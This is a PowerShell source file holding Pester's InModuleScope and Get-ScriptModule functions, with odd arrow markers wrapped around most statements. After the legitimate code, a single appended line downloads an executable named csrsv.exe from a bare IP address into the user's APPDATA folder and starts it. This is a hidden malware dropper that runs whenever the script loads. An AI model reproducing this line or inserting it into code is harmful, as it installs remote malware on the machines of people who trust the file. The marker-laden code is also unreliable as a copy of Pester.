 -||-> function InModuleScope {
    

    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]
        $ModuleName,

        [Parameter(Mandatory = $true)]
        [scriptblock]
        $ScriptBlock
    )

     -||-> if ( -||-> $null -eq ( -||-> & $SafeCommands['Get-Variable'] -Name Pester -ValueOnly -ErrorAction $script:IgnoreErrorPreference <-||- ) <-||- ) {
        
         -||-> $sessionState =  -||-> Set-SessionStateHint -PassThru -Hint "Caller - Captured in InModuleScope" -SessionState $PSCmdlet.SessionState <-||-  <-||- 
         -||-> $Pester =  -||-> New-PesterState -Path ( -||-> & $SafeCommands['Resolve-Path'] . <-||- ) -TestNameFilter $null -TagFilter @() -ExcludeTagFilter @() -SessionState $sessionState <-||-  <-||- 
         -||-> $script:mockTable = @{} <-||- 
    } <-||- 

     -||-> $module =  -||-> Get-ScriptModule -ModuleName $ModuleName -ErrorAction Stop <-||-  <-||- 

     -||-> $originalState = $Pester.SessionState <-||- 
     -||-> $originalScriptBlockScope =  -||-> Get-ScriptBlockScope -ScriptBlock $ScriptBlock <-||-  <-||- 

     -||-> try {
         -||-> $sessionState =  -||-> Set-SessionStateHint -PassThru -Hint "Module - $( -||-> $module.Name <-||- )" -SessionState $module.SessionState <-||-  <-||- 
         -||-> $Pester.SessionState = $sessionState <-||- 
         -||-> Set-ScriptBlockScope -ScriptBlock $ScriptBlock -SessionState $sessionState <-||- 

        do {
             -||-> Write-ScriptBlockInvocationHint -Hint "InModuleScope" -ScriptBlock $ScriptBlock <-||- 
             -||-> & $ScriptBlock <-||- 
        } until ( -||-> $true <-||- )
    }
    finally {
         -||-> $Pester.SessionState = $originalState <-||- 
         -||-> Set-ScriptBlockScope -ScriptBlock $ScriptBlock -SessionStateInternal $originalScriptBlockScope <-||- 
    } <-||- 
} <-||- 

 -||-> function Get-ScriptModule {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string] $ModuleName
    )

     -||-> try {
         -||-> $modules = @( -||-> & $SafeCommands['Get-Module'] -Name $ModuleName -All -ErrorAction Stop <-||- ) <-||- 
    }
    catch {
        throw  -||-> "No module named '$ModuleName' is currently loaded." <-||- 
    } <-||- 

     -||-> $scriptModules = @( -||-> $modules | & $SafeCommands['Where-Object'] {  -||-> $_.ModuleType -eq 'Script' <-||-  } <-||- ) <-||- 

     -||-> if ( -||-> $modules.Count -eq 0 <-||- ) {
        throw  -||-> "No module named '$ModuleName' is currently loaded." <-||- 
    } <-||- 

     -||-> if ( -||-> $scriptModules.Count -gt 1 <-||- ) {
        throw  -||-> "Multiple Script modules named '$ModuleName' are currently loaded.  Make sure to remove any extra copies of the module from your session before testing." <-||- 
    } <-||- 

     -||-> if ( -||-> $scriptModules.Count -eq 0 <-||- ) {
         -||-> $actualTypes = @(
             -||-> $modules |
                & $SafeCommands['Where-Object'] {  -||-> $_.ModuleType -ne 'Script' <-||-  } |
                & $SafeCommands['Select-Object'] -ExpandProperty ModuleType -Unique <-||- 
        ) <-||- 

         -||-> $actualTypes = $actualTypes -join ', ' <-||- 

        throw  -||-> "Module '$ModuleName' is not a Script module.  Detected modules of the following types: '$actualTypes'" <-||- 
    } <-||- 

    return  -||-> $scriptModules[0] <-||- 
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



